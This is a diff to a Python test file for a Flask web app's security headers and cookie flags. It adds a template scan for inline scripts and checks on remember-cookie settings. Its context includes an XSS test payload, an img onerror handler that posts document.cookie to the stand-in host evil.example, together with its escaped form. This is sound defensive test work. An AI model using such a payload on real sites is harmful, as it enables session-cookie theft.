@@ -5,6 +5,7 @@ flags that limit what an injected script could do stay in place."""
 
 import importlib
 import os
+import re
 import sys
 import unittest
 from unittest import mock
@@ -21,6 +22,7 @@ from state import create_state_client
 PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example\', {method: \'POST\', body: document.cookie})">'
 ESCAPED_PAYLOAD = ("&lt;img src=x onerror=&#34;fetch(&#39;https://evil.example&#39;, "
                    "{method: &#39;POST&#39;, body: document.cookie})&#34;&gt;")
+TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
 ENV = {"CANVAS_SERVER_URL": "https://canvas.test/", "CANVAS_CLIENT_ID": "id",
        "CANVAS_CLIENT_SECRET": "secret", "SECRET_KEY": "test", "DATABASE_URL": "sqlite:///:memory:"}
 
@@ -78,6 +80,16 @@ class SecurityHeaderTests(unittest.TestCase):
                 self.assertNotIn("form-action", policy)
                 self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")
 
+    def test_templates_have_no_inline_script(self):
+        # script-src has no 'unsafe-inline', so the browser would ignore these; put the script in
+        # assets/js instead (as with assets/js/confirm.js for data-confirm= forms).
+        for name in os.listdir(TEMPLATES_DIR):
+            with self.subTest(template=name), open(os.path.join(TEMPLATES_DIR, name)) as f:
+                html = f.read()
+                self.assertEqual(re.findall(r"<[^>]*\son[a-z]+\s*=", html), [])
+                self.assertEqual(re.findall(r"<script(?![^>]*\ssrc=)[^>]*>", html), [])
+                self.assertNotIn("javascript:", html)
+
     def test_the_app_sends_the_security_headers(self):
         with mock.patch.dict(os.environ, {**ENV, "FLASK_ENV": "development"}):
             sys.modules.pop("main", None)
@@ -88,7 +100,7 @@ class SecurityHeaderTests(unittest.TestCase):
 
 
 class SessionCookieTests(unittest.TestCase):
-    def test_deployed_session_cookie_is_http_only_lax_and_secure(self):
+    def test_deployed_session_and_remember_cookies_are_http_only_lax_and_secure(self):
         for env in ["staging", "production"]:
             with self.subTest(env=env), mock.patch.dict(os.environ, {**ENV, "FLASK_ENV": env}):
                 app = Flask(__name__)
@@ -96,3 +108,7 @@ class SessionCookieTests(unittest.TestCase):
                 self.assertIs(app.config["SESSION_COOKIE_HTTPONLY"], True)
                 self.assertEqual(app.config["SESSION_COOKIE_SAMESITE"], "Lax")
                 self.assertIs(app.config["SESSION_COOKIE_SECURE"], True)
+                # Flask-Login's remember cookie is HttpOnly by default
+                self.assertIs(app.config.get("REMEMBER_COOKIE_HTTPONLY", True), True)
+                self.assertEqual(app.config["REMEMBER_COOKIE_SAMESITE"], "Lax")
+                self.assertIs(app.config["REMEMBER_COOKIE_SECURE"], True)
